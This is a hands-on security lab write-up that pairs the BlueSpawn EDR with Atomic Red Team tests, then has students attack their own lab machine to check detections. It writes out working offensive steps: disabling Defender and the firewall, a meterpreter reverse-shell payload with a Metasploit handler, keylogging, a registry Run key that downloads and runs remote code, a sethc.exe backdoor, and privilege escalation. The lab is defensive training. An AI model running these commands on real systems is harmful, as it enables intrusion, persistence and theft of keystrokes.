![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Atomic Red Team And Bluespawn

In this lab we will be using Bluespawn as a stand-in for an EDR system.  Normally full EDRs like Cylance and Crowdstrike are very expensive and tend not to show up in classes like this.  However, the folks at University of Virginia have done an outstanding job with BlueSpawn. 

BlueSpawn will monitor the system for "weird" behavior and note it when it occurs. For the money, it is great.

In this lab, we will be starting BlueSpawn and then running Atomic Red Team to trigger a lot of alerts.

First, we need to disable Defender. 
Start by opening up <b>Windows Powershell</b>.

<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />


Next, run the following command:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

```ps
Set-MpPreference -DisableBehaviorMonitoring $true
```

<img width="824" height="155" alt="2026-03-26_09-47" src="https://github.com/user-attachments/assets/d83571b4-0a39-4e4b-a9ef-cf6763954e2c" />


This will disable Defender for this session.

>[!NOTE]
>
>If you get angry red errors, that is Ok, it means Defender is not running.


Now, let's open a **command prompt**:

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/f62f8205-8828-4a2b-97f0-e7137ec466e5" />

 
Next, let’s change directories to tools and start Bluespawn:

```bash
cd \IntroLabs
```

```bash
BLUESPAWN-client-x64.exe --monitor --aggressiveness cursory
```

You should see something like this:

<img width="862" height="638" alt="2026-03-26_09-50" src="https://github.com/user-attachments/assets/a3419596-b4ca-4ea1-8d2a-832046873f76" />


If you made it this far, perfect! That means Bluespawn is up and running.

Now, let’s use Atomic Red Team to test the monitoring with BlueSpawn:

First, we need to open a PowerShell terminal. 

You can do this by selecting the icon in the taskbar/desktop:

<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />

Now we need to install and update Atomic Red Team. Run the following:

```bash
cd \
```

```ps
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics -Force
```

>[!NOTE]
>
> This can take a bit. After about 120 seconds, try hitting enter to get your prompt back.

Once you see the following, you are set to move forward:

![](attachments/installationconfirmation.png)

Next, in the PowerShell Window we need to navigate to the Atomic Red Team directory and import the powershell modules:

```ps
cd C:\AtomicRedTeam\invoke-atomicredteam\
```

Then, install the proper `yaml` modules by running the following:

```ps
Install-Module -Name powershell-yaml
```

>[!NOTE]
>
>When prompted, press Y to install the modules.

```ps
Import-Module .\Invoke-AtomicRedTeam.psm1
```


Once we do this, we need to invoke all the Atomic Tests.

>[!IMPORTANT]  
>
>Don't do this in production...  Ever.
>  
>Always run tools like Atomic Red Team on test systems.
>
>We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode. This is so you can see what the protection would have done, but it will allow the tests to finish so we are just going to run individual tests for now.

Run the following individually:

```ps
Invoke-AtomicTest T1547.004
```

More information here:

https://attack.mitre.org/techniques/T1547/004/

```ps
Invoke-AtomicTest T1543.003
```

More information here:

https://attack.mitre.org/techniques/T1543/003/

```ps
Invoke-AtomicTest T1547.001
```

More information here:

https://attack.mitre.org/techniques/T1547/001/

```ps
Invoke-AtomicTest T1546.008
```

More information here:

https://attack.mitre.org/techniques/T1546/008/


>[!TIP]
>
>If you get any “file exists” questions or errors, just select `Yes`.

It should look like this:

![](attachments/invokeatomicv1.png)

>[!NOTE]
>
>There might be some errors when this runs. This is 
normal.

>[!NOTICE]
>
>We had to cross reference the old numbering with the new.
>
>You can find that mapping here:
>
>https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
>
>![](attachments/crossreference.png)


You should be getting a lot of alerts with Bluespawn! Switch tabs in your Terminal to see them:

![](attachments/bluespawndetections.png)

Now, let’s go back to the PowerShell window and clean up:

```ps
Invoke-AtomicTest All -Cleanup
```

It should look like this:

![](attachments/Clipboard_2020-06-23-13-36-10.png)

# If you have more time

Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:

<img width="54" height="39" alt="image" src="https://github.com/user-attachments/assets/a0e67fe8-d42a-4795-b566-98dc7a82daa8" />


Next, run the following command in the **Powershell** terminal:

<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>

<img width="786" height="223" alt="image" src="https://github.com/user-attachments/assets/def5f9b6-22c7-4278-9b37-fbfb5af3a02e" />

This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

<pre> netsh advfirewall set allprofiles state off</pre>


Next, set a password for the Administrator account that you can remember

<pre>net user Administrator password1234</pre>

Please note, that is a very bad password.  Come up with something better. But, please remember it.

Before we move on from our Powershell window, lets get our IP by running the following command:

<pre>ipconfig</pre>


**REMEMBER - YOUR IP WILL BE DIFFERENT**

Write this IP down so we can use it again later.

Let's continue by opening a **Kali** terminal

<img width="71" height="68" alt="image" src="https://github.com/user-attachments/assets/5f116093-6854-4e55-a231-0c42359dc163" />

Alternatively, you can click on the **Kali** icon in the taskbar.


We need to run the following commands in order to mount our remote system to the correct directory:

<pre>sudo su -</pre>

<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>

**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**



Run the following command to navigate into the mounted directory:

<pre>cd /mnt/windows-share</pre>

<img width="645" height="251" alt="image" src="https://github.com/user-attachments/assets/b3a98a1f-559f-46b3-8967-88457212d1ee" />


Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:

<pre>ifconfig</pre>

<img width="660" height="419" alt="image" src="https://github.com/user-attachments/assets/d88c93b2-c80f-4a88-ba71-3e82cbcf20a2" />


**REMEMBER: YOUR IP WILL BE DIFFERENT**

Run the following commands to start a simple backdoor and backdoor listener: 

<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>

<img width="646" height="148" alt="image" src="https://github.com/user-attachments/assets/d84a0070-9c3f-47cb-b1b4-ea447ddbdeef" />



Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.

<img width="71" height="68" alt="image" src="https://github.com/user-attachments/assets/5f116093-6854-4e55-a231-0c42359dc163" />


Let's become root.

<pre>sudo su -</pre>

Now let's start the **Metasploit** Handler

<pre>msfconsole -q</pre>

We are going to run the following commands to correctly set the parameters:

<pre>use exploit/multi/handler</pre>

<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>

<pre>set LHOST [Your Linux IP Address]</pre>

Remember, **Your IP will be different!**

<pre>exploit</pre>

It should look like this:

<img width="636" height="405" alt="image" src="https://github.com/user-attachments/assets/ca5787cd-967d-45b0-ac90-327b4eabfe69" />


We will need to open a **"cmd.exe"** terminal as **Administrator**.

<img width="53" height="40" alt="image" src="https://github.com/user-attachments/assets/47d5e363-0b2a-4009-a117-6103db26870d" />



let's run the following commands to run the **"TrustMe.exe"** file.

<pre>cd \</pre>
 
Then run it with the following:

 <pre>TrustMe.exe</pre>

Back at your Kali terminal, you should have a metasploit session!

![](attachments/meterpretersession.png)


Now, let’s look at keystroke logging.

To learn more about this check out MITRE:

https://attack.mitre.org/techniques/T1056/

Also, below is a list of just some of the threat groups that use this technique:

<img width="1072" height="723" alt="image" src="https://github.com/user-attachments/assets/c005128b-124b-4bcc-9bf7-8516ca4be2d6" />


Run commands

meterpreter > `keyscan_start`

Go and type something on your Windows system.

meterpreter > `keyscan_dump`

![](attachments/Clipboard_2020-06-15-13-52-00.png)


Go and check Bluespawn.  Did it detect it?

Now, let’s play with registry persistence.

To learn more about this check out MITRE:

https://attack.mitre.org/techniques/T1547/

Here are just some of the groups that use this technique:

<img width="1072" height="533" alt="image" src="https://github.com/user-attachments/assets/86040c18-29cd-4d16-95dd-84e45dcb1f63" />


meterpreter > `shell`

C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`

C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`

![](attachments/Clipboard_2020-06-15-14-00-53.png)

Go and check Bluespawn.  Did it detect it?

Next, let’s play with privilege escalation.

Here is al link to more info about this from MITRE:

https://attack.mitre.org/techniques/T1543/

Here are just some of the groups that use this technique:

<img width="1087" height="489" alt="image" src="https://github.com/user-attachments/assets/41b91eb5-8505-48a3-bee0-09cbb87f9dca" />


meterpreter >`getsystem`

![](attachments/Clipboard_2020-06-15-13-52-28.png)


![](attachments/Clipboard_2020-06-15-13-56-34.png)

Go and check Bluespawn.  Did it detect it?

***                                                                 

<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/deepbluecliIntroClass/DeepBlueCLI.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/AppLocker/AppLocker.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---













